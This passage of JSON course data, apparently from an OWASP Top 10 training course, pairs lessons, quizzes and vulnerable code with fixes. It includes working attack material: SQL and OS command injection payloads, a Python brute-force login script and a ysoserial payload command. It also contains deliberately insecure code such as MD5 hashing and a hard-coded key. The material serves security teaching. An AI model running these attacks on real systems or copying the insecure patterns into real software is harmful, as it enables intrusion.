                            "content": "<p>A cryptographic system is only as strong as its key management. How you store and protect your encryption keys is paramount.</p><h3>Common Failures:</h3><ul><li><strong>Hard-coded Keys:</strong> The most common and dangerous mistake is embedding an encryption key directly in the source code or a configuration file. If an attacker gains access to the code repository, they now have the key to decrypt all your data.</li><li><strong>Weak Keys:</strong> Using short or easily guessable keys (like 'password123').</li></ul><div class='info-box tip'><div class='info-box-header'><i class='fas fa-lightbulb'></i><strong>Use a Key Vault</strong></div><p>Keys and other secrets should *never* be stored in code. They should be stored in a secure secrets management system, like Azure Key Vault or GCP's Secret Manager, and retrieved by the application at runtime using a managed identity.</p></div>",
                            "image": "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Vulnerable: Weak Password Hashing (PHP)",
                        "language": "php",
                        "code": "<?php\n// This is extremely insecure. MD5 is broken and easily cracked.\n// It also does not use a salt.\n$password = $_POST['password'];\n$hashed_password = md5($password);\n// store $hashed_password in DB\n?>"
                    },
                    {
                        "title": "Secure: Modern Password Hashing (PHP)",
                        "language": "php",
                        "code": "<?php\n// password_hash() uses a modern, strong, and salted hashing algorithm (currently bcrypt).\n// It handles the generation of a secure random salt for you.\n$password = $_POST['password'];\n$hashed_password = password_hash($password, PASSWORD_DEFAULT);\n// To verify:\n// password_verify($submitted_password, $hash_from_db)\n?>"
                    },
                    {
                        "title": "Vulnerable: Hard-coded Encryption Key (Java)",
                        "language": "java",
                        "code": "public class InsecureEncryption {\n    // DANGER: Key is hard-coded directly in the source code.\n    private static final String SECRET_KEY = \"mySup3rS3cr3tK3y\";\n\n    public String encrypt(String data) {\n        // ... encryption logic using SECRET_KEY ...\n    }\n}"
                    },
                    {
                        "title": "Vulnerable: Cleartext Login Form Submission (HTML)",
                        "language": "html",
                        "code": "<!-- DANGER: The form action uses http:// instead of https:// -->\n<!-- The username and password will be sent in cleartext over the network -->\n<form action=\"http://example.com/login\" method=\"post\">\n  Username: <input type=\"text\" name=\"username\"><br>\n  Password: <input type=\"password\" name=\"password\"><br>\n  <input type=\"submit\" value=\"Log In\">\n</form>"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Storing an encryption key directly in your application's source code is an example of what?", "options": ["A key management failure", "A strong security practice", "An injection attack", "A cross-site scripting attack"], "correct": 0, "explanation": "This is a critical key management failure. Secrets and code must be kept separate. Keys should be stored in a dedicated secrets management service like Key Vault." },
                        { "id": 2, "question": "A login form that submits a user's password to the server over an HTTP connection (not HTTPS) is vulnerable to:", "options": ["Eavesdropping and interception of the password in cleartext", "SQL Injection", "Server-Side Request Forgery", "No vulnerabilities, HTTP is secure"], "correct": 0, "explanation": "Without HTTPS (TLS), all data, including sensitive credentials, is sent as cleartext, which can be easily intercepted by an attacker on the same network." },
                        { "id": 3, "question": "Why is hashing a password with MD5 or SHA1 considered insecure?", "options": ["These algorithms are too slow", "These algorithms are considered broken and are fast enough to be brute-forced easily with modern hardware", "They are too new to be trusted", "They use too much memory"], "correct": 1, "explanation": "MD5 and SHA1 are deprecated for password hashing because of their susceptibility to collision attacks and the speed at which they can be cracked. Modern applications must use strong, slow hashing functions like Argon2, scrypt, or bcrypt." }
                    ]
                }
            },
            {
                "id": "lesson-7-a03-injection",
                "title": "Lesson 7: A03 - Injection Attacks",
                "duration": "150 min",
                "objectives": [
                    "Understand and exploit SQL Injection vulnerabilities",
                    "Identify NoSQL and OS Command Injection vulnerabilities",
                    "Learn how an attacker can leverage injection to bypass authentication or exfiltrate data",
                    "Apply the primary defense against injection: parameterized queries"
                ],
                "content": {
                    "overview": "Injection flaws are one of the oldest and most dangerous classes of web vulnerabilities. They occur when an application trusts user-supplied data and includes it in a command or query, allowing an attacker to change the logic of that command. This lesson provides a deep dive into the most common type, SQL Injection, as well as its dangerous cousin, OS Command Injection.",
                    "sections": [
                        {
                            "title": "SQL Injection (SQLi)",
                            "content": "<p>SQL Injection occurs when user input is concatenated directly into a SQL query. This allows an attacker to break out of the data context and insert their own SQL commands, which will be executed by the database.</p><h3>The Root Cause: Mixing Code and Data</h3><p>The fundamental flaw is that the application is building a SQL query by mixing its own code (the `SELECT` statement) with untrusted data (the user's input). The database can't tell which is which, and an attacker can craft their input to be interpreted as code.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>Impact</strong></div><p>A successful SQL injection can result in a complete compromise of the database: an attacker can read all data, modify data, delete data, and in some cases, even execute commands on the underlying operating system.</p></div>",
                            "image": "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "OS Command Injection",
                            "content": "<p>OS Command Injection is similar, but instead of injecting into a SQL query, the attacker injects into a command that will be executed by the operating system's shell. This can happen in applications that need to call external system commands.</p><p>For example, a diagnostic tool might have a feature to ping a hostname provided by the user. If the application simply concatenates this hostname into the `ping` command, an attacker can use a command separator (like `;` or `&&` in Linux) to append their own commands.</p>",
                            "image": "https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "The Primary Defense: Parameterized Queries",
                            "content": "<p>The number one defense against injection attacks is to **NEVER** build queries by concatenating strings. You must use **parameterized queries** (also called prepared statements).</p><h3>How they Work:</h3><ol><li>You define the SQL query with placeholders (`?` or `:name`) for any user-supplied values.</li><li>You then send the query to the database. The database parses this query and builds an execution plan.</li><li>Separately, you send the user-supplied values to the database. The database binds these values to the placeholders in the pre-compiled plan.</li></ol><p>This is secure because the user input is never interpreted as code; it is always treated as data. The query's structure cannot be changed by the user's input.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Vulnerable SQLi Code (Java)",
                        "language": "java",
                        "code": "String userName = request.getParameter(\"username\");\nString query = \"SELECT * FROM users WHERE username = '\" + userName + \"'\"; // DANGER!\nStatement statement = connection.createStatement();\nResultSet results = statement.executeQuery(query);"
                    },
                    {
                        "title": "Classic SQLi Authentication Bypass Payload",
                        "language": "sql",
                        "code": "# User enters this in the username field:\n' OR '1'='1\n\n# The final query becomes:\nSELECT * FROM users WHERE username = '' OR '1'='1'\n\n# Because '1'='1' is always true, the WHERE clause is always true, and the query returns all users, bypassing authentication."
                    },
                    {
                        "title": "Secure Parameterized Query (Java)",
                        "language": "java",
                        "code": "String userName = request.getParameter(\"username\");\nString query = \"SELECT * FROM users WHERE username = ?\"; // Placeholder used\nPreparedStatement statement = connection.prepareStatement(query);\nstatement.setString(1, userName); // User input is bound as data\nResultSet results = statement.executeQuery();"
                    },
                    {
                        "title": "Vulnerable OS Command Injection (Python/Flask)",
                        "language": "python",
                        "code": "import os\nfrom flask import request\n\n@app.route('/tools/ping')\ndef ping():\n    hostname = request.args.get('host')\n    # DANGER! Concatenating user input into a system command.\n    response = os.popen(f\"ping -c 1 {hostname}\").read()\n    return response"
                    },
                    {
                        "title": "OS Command Injection Payload",
                        "language": "http",
                        "code": "# Attacker wants to list files. They use a semicolon to separate commands.\nGET /tools/ping?host=example.com;ls%20-la HTTP/1.1\n\n# The server will execute: ping -c 1 example.com; ls -la\n# The response will contain the ping result AND the file listing."
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the root cause of an SQL Injection vulnerability?", "options": ["Using a weak encryption algorithm", "Not validating user email addresses", "Concatenating untrusted user input directly into a SQL query string", "Not having a firewall"], "correct": 2, "explanation": "The core flaw is mixing code (the SQL statement) and data (the user input) in a way that allows the database to interpret the data as code." },
                        { "id": 2, "question": "What is the primary and most effective defense against SQL Injection?", "options": ["Input filtering for apostrophes", "Using a Web Application Firewall (WAF)", "Using parameterized queries (prepared statements)", "Hashing all user input"], "correct": 2, "explanation": "Parameterized queries are a structural fix. They create a fundamental separation between code and data, making this entire class of vulnerability impossible." },
                        { "id": 3, "question": "An attacker submits `8.8.8.8; whoami` into a field for a network diagnostic tool. This is an attempt to exploit what kind of vulnerability?", "options": ["Cross-Site Scripting", "SQL Injection", "OS Command Injection", "Insecure Deserialization"], "correct": 2, "explanation": "The semicolon (;) is a command separator in many shells. The attacker is attempting to chain their own `whoami` command onto the end of the intended command." }
                    ]
                }
            },
            {
                "id": "lesson-8-a04-insecure-design",
                "title": "Lesson 8: A04 - Insecure Design",
                "duration": "120 min",
                "objectives": [
                    "Understand that insecure design is a different category from insecure implementation",
                    "Learn the fundamentals of threat modeling as a proactive security practice",
                    "Apply secure design principles like defense-in-depth and fail-secure",
                    "Recognize insecure design patterns that lead to vulnerabilities"
                ],
                "content": {
                    "overview": "This is a new category for 2021, representing a move to 'shift left'. Insecure Design focuses on flaws at a higher levelthe design and architecture of the application. The issue is not a bug in the code, but a weakness in the underlying business logic or a failure to plan for security from the beginning.",
                    "sections": [
                        {
                            "title": "Implementation vs. Design Flaws",
                            "content": "<p>It's important to understand the difference.</p><ul><li><strong>Implementation Flaw:</strong> The design was good, but the developer made a mistake writing the code. *Example:* The designer intended for a page to have an access control check, but the developer forgot to add it. This is a *Broken Access Control* bug.</li><li><strong>Design Flaw:</strong> The developer implemented the designer's specification perfectly, but the specification itself was insecure. *Example:* A designer creates a password reset workflow that asks a user a single, easily guessable 'secret question'. The developer implements this exactly as designed. The flaw is in the *design* of the workflow itself.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1499750310107-5fef28a66643?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Threat Modeling Fundamentals",
                            "content": "<p>The primary way to combat insecure design is with threat modeling. Threat modeling is a structured process done *during the design phase* to proactively identify and mitigate potential security threats.</p><h3>The Threat Modeling Process:</h3><ol><li><strong>Decompose the Application:</strong> Diagram the architecture and the data flows.</li><li><strong>Identify Threats:</strong> For each component and data flow, brainstorm what could go wrong. A framework like STRIDE can be used here.</li><li><strong>Determine Mitigations:</strong> For each threat, propose a security control to mitigate it.</li></ol><p>Doing this exercise *before* writing code allows you to build security into the design from the start, which is far cheaper and more effective than trying to bolt it on at the end.</p>",
                            "image": "https://images.unsplash.com/photo-1542626991-cbc4e32524cc?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Which of the following is an example of an Insecure Design flaw?", "options": ["A developer accidentally introduces a buffer overflow.", "A shopping cart workflow that allows a user to add a negative quantity of items to their cart, giving them a credit.", "A developer forgets to validate user input, leading to XSS.", "A server is not patched for a known vulnerability."], "correct": 1, "explanation": "This is a business logic flaw in the design. The code may be perfectly implemented, but the design itself is flawed because it doesn't account for this abusive use case. This is an insecure design, not an insecure implementation." },
                        { "id": 2, "question": "The proactive process of identifying security flaws during the architecture and design phase of an application is called:", "options": ["Penetration Testing", "Threat Modeling", "Incident Response", "Vulnerability Scanning"], "correct": 1, "explanation": "Threat modeling is the key 'shift left' activity that helps to prevent insecure design flaws from ever being coded." }
                    ]
                }
            },
            {
                "id": "lesson-9-a05-security-misconfiguration",
                "title": "Lesson 9: A05 - Security Misconfiguration",
                "duration": "120 min",
                "objectives": [
                    "Identify risks from default configurations and unchanged default passwords",
                    "Detect the exposure of unnecessary features, ports, and services",
                    "Find verbose error messages that leak sensitive information",
                    "Audit for missing security headers and insecure cloud service configurations"
                ],
                "content": {
                    "overview": "This category covers security issues that result not from a code flaw, but from an insecure configuration of the application, its frameworks, the web server, or the cloud services it runs on. These are often easy-to-find and easy-to-fix issues that provide a foothold for attackers.",
                    "sections": [
                        {
                            "title": "Default and Insecure Configurations",
                            "content": "<ul><li><strong>Unchanged Default Credentials:</strong> Many hardware and software components ship with default administrative passwords (like `admin`/`admin`). Failing to change these is a critical vulnerability.</li><li><strong>Directory Listing Enabled:</strong> If a web server has directory listing enabled, an attacker can browse the server's directory structure, potentially finding sensitive files.</li><li><strong>Unnecessary Services Enabled:</strong> A hardened server should have the absolute minimum number of services and features enabled to reduce its attack surface. For example, a web server probably doesn't need FTP or Telnet enabled.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Information Leakage through Errors",
                            "content": "<p>Application error messages must be configured correctly. Verbose error messages shown to a user can provide an attacker with a gold mine of information about the application's internal workings.</p><p>An unhandled exception might leak a full stack trace, revealing the exact framework, version, and database type in use, along with internal file paths. The application should be configured to show the user a generic error page, while logging the detailed error on the server-side for developers to debug.</p>",
                            "image": "https://images.unsplash.com/photo-1542337829-9173cace55f1?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Missing Security Headers",
                            "content": "<p>There are a number of HTTP response headers an application can send to the browser to enable its built-in security features. Failing to send these headers is a common misconfiguration.</p><h3>Key Security Headers:</h3><ul><li><strong>`Strict-Transport-Security` (HSTS):</strong> Tells the browser to only ever connect to this site using HTTPS.</li><li><strong>`Content-Security-Policy` (CSP):</strong> A powerful header that provides a whitelist of where the browser is allowed to load resources (scripts, images, etc.) from. A well-configured CSP is a primary defense against XSS.</li><li><strong>`X-Content-Type-Options: nosniff`</strong>: Prevents the browser from trying to guess the content type of a file, which can mitigate some XSS attacks.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit-crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Verbose Error Message Leakage (Example)",
                        "language": "python",
                        "code": "# A user sees this in their browser after causing an error.\n\nOperationalError: (2002, \"Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2)\")\n  File \"/var/www/app/main.py\", line 101, in get_user_data\n  db.connect()\n\n# This tells an attacker:\n# 1. You are using Python.\n# 2. You are using MySQL.\n# 3. An internal file path is /var/www/app/main.py"
                    },
                    {
                        "title": "Check for Security Headers with curl",
                        "language": "bash",
                        "code": "# The '-I' flag tells curl to only fetch the headers of the response.\n# Look through the response for the presence of HSTS, CSP, etc.\ncurl -I https://www.example.com"
                    },
                    {
                        "title": "Example Content Security Policy (CSP)",
                        "language": "http",
                        "code": "# This header tells the browser to only load scripts from its own origin\n# and from 'apis.google.com'. All other scripts will be blocked.\nContent-Security-Policy: script-src 'self' apis.google.com;"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "An application that displays a detailed stack trace to the user in the event of a database error is an example of what?", "options": ["Insecure Design", "Security Misconfiguration (Information Leakage)", "SQL Injection", "Broken Access Control"], "correct": 1, "explanation": "Error handling is a configuration item. Showing generic errors to users while logging detailed errors on the server is a key security best practice." },
                        { "id": 2, "question": "What is the primary purpose of the `Strict-Transport-Security` (HSTS) header?", "options": ["To encrypt all data on the server", "To instruct the user's browser to only ever communicate with the site over HTTPS", "To block all cookies", "To disable JavaScript"], "correct": 1, "explanation": "HSTS helps to prevent protocol downgrade attacks and cookie hijacking by ensuring the browser always uses an encrypted connection." },
                        { "id": 3, "question": "Failing to change the default 'admin' password on a network device or application framework is a common example of what vulnerability category?", "options": ["Injection", "Security Misconfiguration", "Cryptographic Failures", "Identification and Authentication Failures"], "correct": 1, "explanation": "Using default credentials is one of the most classic and dangerous types of security misconfiguration." }
                    ]
                }
            },
            {
                "id": "lesson-10-a06-vulnerable-components",
                "title": "Lesson 10: A06 - Vulnerable and Outdated Components",
                "duration": "120 min",
                "objectives": [
                    "Understand the risks of using third-party components with known vulnerabilities",
                    "Use Software Composition Analysis (SCA) tools to find vulnerable dependencies",
                    "Grasp the concept of software supply chain security",
                    "Develop strategies for dependency management and patching"
                ],
                "content": {
                    "overview": "Modern applications are not written from scratch; they are assembled from hundreds of open-source and third-party libraries and frameworks. If you are using a component with a known vulnerability, your application is also vulnerable. This lesson covers how to manage this software supply chain risk.",
                    "sections": [
                        {
                            "title": "The Risk of Dependencies",
                            "content": "<p>Almost every application today relies heavily on open source libraries (e.g., from `npm` for Node.js, `pip` for Python, `Maven` for Java). These libraries are code you did not write, but you are still responsible for its security if you include it in your application.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>Real World Example: Log4Shell</strong></div><p>The Log4Shell vulnerability (CVE-2021-44228) in the popular Log4j Java logging library was a catastrophic example of this risk. A single vulnerability in one widely used logging library made hundreds of thousands of applications worldwide instantly vulnerable to remote code execution. This highlighted the critical importance of knowing what components you are using.</p></div>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Software Composition Analysis (SCA)",
                            "content": "<p>You cannot manually track the vulnerabilities in all your dependencies. This must be automated using Software Composition Analysis (SCA) tools.</p><h3>How SCA Tools Work:</h3><p>An SCA tool scans your application's dependency manifest file (e.g., `package.json`, `pom.xml`, `requirements.txt`). It builds a list of all your direct and transitive dependencies and their exact versions. It then compares this list against a database of known vulnerabilities (like the National Vulnerability Database - NVD). It then produces a report of all the vulnerable components you are using, their severity, and often, what version you need to upgrade to in order to fix the issue.</p>",
                            "image": "https://images.unsplash.com/photo-1518770660439-4636190af475?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Vulnerable Dependency in package.json (Node.js)",
                        "language": "json",
                        "code": "{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"express\": \"4.17.0\", // This is a slightly older version\n    \"lodash\": \"4.17.15\"    // This specific version of lodash has known vulnerabilities\n  }\n}"
                    },
                    {
                        "title": "Running an SCA Scan with npm audit",
                        "language": "bash",
                        "code": "# `npm audit` is a built-in SCA tool in the Node.js package manager.\n# It will scan your package-lock.json and report known vulnerabilities in your dependencies.\nnpm audit"
                    },
                    {
                        "title": "OWASP Dependency-Check (Command Line SCA)",
                        "language": "bash",
                        "code": "# A popular open-source SCA tool that can be used for many different languages.\ndependency-check.sh --scan . --project \"My Web App\" --format HTML"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary function of a Software Composition Analysis (SCA) tool?", "options": ["To scan your custom source code for flaws", "To scan your third-party dependencies and libraries for known vulnerabilities (CVEs)", "To attack a running application", "To manage firewall rules"], "correct": 1, "explanation": "SCA is focused on managing the risk of your software supply chain by identifying known vulnerabilities in the components you use." },
                        { "id": 2, "question": "The Log4Shell vulnerability was a critical example of what OWASP Top 10 category?", "options": ["Injection", "Broken Access Control", "Vulnerable and Outdated Components", "Insecure Design"], "correct": 2, "explanation": "It was a textbook case of a single, widely-used third-party component having a vulnerability that then made countless other applications that used it vulnerable as well." }
                    ]
                }
            },
            {
                "id": "lesson-11-a07-authn-failures",
                "title": "Lesson 11: A07 - Identification and Authentication Failures",
                "duration": "120 min",
                "objectives": [
                    "Identify weaknesses in password policies and password storage",
                    "Understand and exploit session management flaws like predictable session tokens",
                    "Test for vulnerabilities that could allow for multi-factor authentication bypass",
                    "Recognize the threat of credential stuffing and how to mitigate it"
                ],
                "content": {
                    "overview": "Formerly 'Broken Authentication,' this category focuses on confirming user identity, authentication, and session management. Flaws here can allow an attacker to completely impersonate a legitimate user without needing to find another vulnerability.",
                    "sections": [
                        {
                            "title": "Weak Password Policies and Credential Stuffing",
                            "content": "<ul><li><strong>Weak Policies:</strong> The application may allow short, simple, or commonly used passwords. It may also not have any mechanism to block brute-force attacks (trying many passwords) or password spraying (trying one common password against many users).</li><li><strong>Credential Stuffing:</strong> This is the most common authentication attack today. Attackers take large dumps of usernames and passwords stolen from other data breaches and 'stuff' them into your application's login form. Because many users reuse passwords, this has a high rate of success. Mitigations include requiring MFA and monitoring for a high rate of failed logins from a single IP.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1548092372-6a7e3206a5a2?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Session Management Flaws",
                            "content": "<p>As we learned in Lesson 3, session tokens are the 'keys' that keep a user logged in. Flaws in how these tokens are generated and managed can allow an attacker to hijack a user's session.</p><h3>Common Flaws:</h3><ul><li><strong>Predictable Session IDs:</strong> If the session tokens are not generated using a cryptographically secure random number generator, an attacker might be able to predict a valid session token and use it.</li><li><strong>Session Fixation:</strong> An attacker forces a user's browser to use a session token that the attacker already knows. When the user logs in, that token becomes authenticated, and the attacker can now use it.</li><li><strong>No Timeout:</strong> Sessions that never expire. If a user logs in from a public computer and forgets to log out, their session could remain active indefinitely for the next person to use.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&h=400&fit-crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Credential Stuffing / Brute Force Attack Script (Python)",
                        "language": "python",
                        "code": "import requests\n\nURL = 'https://example.com/login'\n\n# Open a list of common passwords\nwith open('passwords.txt', 'r') as f:\n    for password in f.readlines():\n        password = password.strip()\n        \n        payload = {'username': 'testuser', 'password': password}\n        response = requests.post(URL, data=payload)\n        \n        # Check if the login was successful based on the response\n        if \"Welcome, testuser\" in response.text:\n            print(f\"[+] Password found: {password}\")\n            break"
                    },
                    {
                        "title": "Vulnerable Session ID Generation (PHP)",
                        "language": "php",
                        "code": "<?php\n// DANGER: Using microtime() is predictable. An attacker can guess these tokens.\n$session_id = md5(microtime());\nsetcookie(\"sessionID\", $session_id);\n?>"
                    },
                    {
                        "title": "Secure Session ID Generation (PHP)",
                        "language": "php",
                        "code": "<?php\n// The session_start() function uses a CSPRNG (Cryptographically Secure Pseudo-Random Number Generator) \n// by default to generate a high-entropy session ID.\n// This is the correct way.\nsession_start();\n?>"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is a credential stuffing attack?", "options": ["A brute-force attack against one user", "An attacker taking username/password lists from other breaches and trying them on your site", "A phishing attack", "A DDoS attack"], "correct": 1, "explanation": "Credential stuffing leverages the widespread problem of password reuse. It's highly effective and a very common attack vector against login forms." },
                        { "id": 2, "question": "Why is it insecure to generate a session ID using something like the current time?", "options": ["The time is a secret", "It is not random and is therefore predictable, allowing an attacker to guess a valid session ID", "It makes the website slow", "It is too long"], "correct": 1, "explanation": "Session tokens must be generated using a cryptographically secure random source to ensure they are unpredictable and cannot be guessed or enumerated by an attacker." }
                    ]
                }
            },
            {
                "id": "lesson-12-a08-integrity-failures",
                "title": "Lesson 12: A08 - Software and Data Integrity Failures",
                "duration": "120 min",
                "objectives": [
                    "Understand software integrity failures related to CI/CD pipeline security",
                    "Identify the risks of insecure deserialization vulnerabilities",
                    "Recognize how an attacker can exploit a supply chain without integrity checks"
                ],
                "content": {
                    "overview": "This category focuses on failures related to the integrity of software and data. It includes vulnerabilities related to insecure updates, modification of sensitive data, and the now-infamous category of insecure deserialization.",
                    "sections": [
                        {
                            "title": "Insecure Deserialization",
                            "content": "<p>Serialization is the process of converting an object from memory into a format (like JSON or a binary string) that can be stored or transmitted. Deserialization is the reverse process. Insecure deserialization occurs when an application deserializes untrusted, user-supplied data without properly validating it. An attacker can craft a malicious serialized object that, when deserialized by the application, will execute arbitrary code on the server.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>Impact</strong></div><p>A successful insecure deserialization attack almost always results in Remote Code Execution (RCE), giving the attacker a full compromise of the server.</p></div>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "CI/CD Pipeline Security",
                            "content": "<p>A failure to protect your CI/CD pipeline against unauthorized access can lead to a devastating software integrity failure. An attacker who compromises the build server could inject malicious code into your application before it is built and deployed. The final, signed application package that gets deployed to production would then contain an attacker's backdoor. Securing the CI/CD pipeline is a critical component of supply chain security.</p>",
                            "image": "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Vulnerable Deserialization Code (Java)",
                        "language": "java",
                        "code": "import java.io.*;\n\npublic class Deserialize {\n    public static void main(String[] args) throws Exception {\n        // DANGER: The code reads a serialized object from an untrusted source (e.g., a file or network stream)\n        FileInputStream fis = new FileInputStream(\"user_data.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n\n        // The vulnerability occurs here when readObject() is called on the untrusted data.\n        User user = (User) ois.readObject();\n        \n        ois.close();\n        System.out.println(\"User: \" + user.name);\n    }\n}"
                    },
                    {
                        "title": "Generating an Exploit Payload with `ysoserial`",
                        "language": "bash",
                        "code": "# ysoserial is a popular tool for generating insecure deserialization payloads for various Java libraries.\n# This command creates a serialized object payload that, when deserialized, will execute the 'touch /tmp/pwned' command on the server.\n\njava -jar ysoserial-master.jar CommonsCollections1 'touch /tmp/pwned' > payload.ser"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is insecure deserialization?", "options": ["An XSS vulnerability", "The act of deserializing untrusted, user-controlled data without proper validation, potentially leading to Remote Code Execution", "A database misconfiguration", "A weak password policy"], "correct": 1, "explanation": "This is a particularly dangerous vulnerability because it involves the application blindly trusting and re-instantiating an object provided by an attacker, which can lead to code execution." },
                        { "id": 2, "question": "Injecting malicious code into a final software package by compromising the build server is an example of a failure in what?",
                         "options": ["CI/CD Pipeline Security", "Database Security", "Network Security", "Client-side Security"], "correct": 0, "explanation": "This is a software supply chain attack. Securing the pipeline that builds and packages your software is essential for maintaining software integrity." }
                    ]
                }
            },
            {
                "id": "lesson-13-a09-logging-monitoring-failures",
                "title": "Lesson 13: A09 - Security Logging and Monitoring Failures",
                "duration": "120 min",
                "objectives": [
                    "Recognize what constitutes insufficient logging and monitoring",
                    "Identify critical security events that must be logged",
                    "Understand how log tampering occurs and how to protect against it",
                    "Analyze logs to detect the signs of an active or past incident"
                ],
                "content": {
                    "overview": "'You can't respond to what you can't see.' This category covers the failure to effectively log, monitor, and alert on security events. Without adequate logging and monitoring, you are effectively blind to an attack. Even if you have other security controls, you won't know if they have failed or been bypassed.",
                    "sections": [
                        {
                            "title": "Insufficient Logging",
                            "content": "<p>Many applications simply do not log the right events at the right level of detail. This makes it impossible to perform a forensic investigation after a breach.</p><h3>What MUST be Logged?:</h3><ul><li><strong>Authentication Events:</strong> All successful and failed login attempts.</li><li><strong>Authorization Failures:</strong> Every time a user tries to access a page or function they are not authorized for (potential signs of probing).</li><li><strong>Input Validation Failures:</strong> Every time the server rejects user input for failing a security check (e.g., finding suspicious characters). This can show that an attacker is actively probing for injection or XSS flaws.</li><li><strong>High-Risk Business Transactions:</strong> Events like password changes, large fund transfers, or changes to user permissions must be logged in detail.</li></ul><p>Log entries must contain sufficient context, including a timestamp, the source IP, the user ID, and a clear description of the event.</p>",
                            "image": "https://images.unsplash.com/photo-1542438408-abb2021e1837?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Monitoring Failures",
                            "content": "<p>Logging data is useless if no one is looking at it. Monitoring is the process of actively analyzing these logs to detect security incidents.</p><h3>Common Failures:</h3><ul><li><strong>No Alerting:</strong> Critical events (like multiple failed logins followed by a success) are being logged, but there is no alert rule in the SIEM to actively notify the security team.</li><li><strong>Alert Fatigue:</strong> The monitoring system generates so many low-quality, false positive alerts that the security team starts to ignore them, potentially missing a real incident.</li><li><strong>Log Protection:</strong> Logs are stored on the same web server as the application. An attacker who compromises the server can then easily delete or modify the logs to cover their tracks. Logs must be shipped to a separate, centralized, and secure logging server or SIEM in near real-time.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the best way to protect application logs from being tampered with by an attacker?", "options": ["Store the logs on the same web server as the application", "Ship the logs in near real-time to a separate, centralized, and secure log management system (like a SIEM)", "Do not generate any logs", "Encrypt the logs with a key stored on the same server"], "correct": 1, "explanation": "Getting logs 'off the box' is a fundamental security principle. Once the log is sent to the central SIEM, an attacker who compromises the web server cannot modify or delete the copy stored in the secure log repository." },
                        { "id": 2, "question": "An application not logging failed login attempts is an example of what?", "options": ["Injection", "Insufficient Logging", "Cross-Site Scripting", "Insecure Design"], "correct": 1, "explanation": "Without a log of failed attempts, it is impossible to detect brute-force or password spraying attacks. This is a critical logging failure." }
                    ]
                }
            },
            {
                "id": "lesson-14-a10-ssrf",
                "title": "Lesson 14: A10 - Server-Side Request Forgery (SSRF)",
                "duration": "120 min",
                "objectives": [
                    "Understand how an SSRF vulnerability allows an attacker to make the server perform requests on their behalf",
                    "Exploit SSRF to scan internal networks and probe for services",
                    "Leverage SSRF in a cloud environment to attack the instance metadata service",
                    "Implement defenses against SSRF through input validation and allow-lists"
                ],
                "content": {
                    "overview": "Server-Side Request Forgery (SSRF) is a vulnerability where an attacker can trick the server-side application into making HTTP requests to an arbitrary domain of the attacker's choosing. This allows the attacker to use the web server as a proxy to attack other internal systems that it can connect to, effectively bypassing the firewall.",
                    "sections": [
                        {
                            "title": "SSRF Attack Techniques",
                            "content": "<p>The vulnerability occurs when an application takes a URL or hostname from user input and makes a request to it without proper validation. For example, a feature that allows a user to specify a URL to an image to be downloaded and displayed.</p><h3>Exploitation Scenarios:</h3><ul><li><strong>Scanning Internal Networks:</strong> An attacker can use the vulnerable server to port scan other machines on the internal network that are not reachable from the internet. They can submit URLs like `http://192.168.1.10:8080`, `http://10.0.0.5:22`, etc., and determine from the server's response time or error messages whether the port is open or closed.</li><li><strong>Attacking Internal Services:</strong> An attacker can use the vulnerability to send requests to internal, unauthenticated web applications.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1596003906915-013661138ae2?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Cloud Metadata Service Attacks",
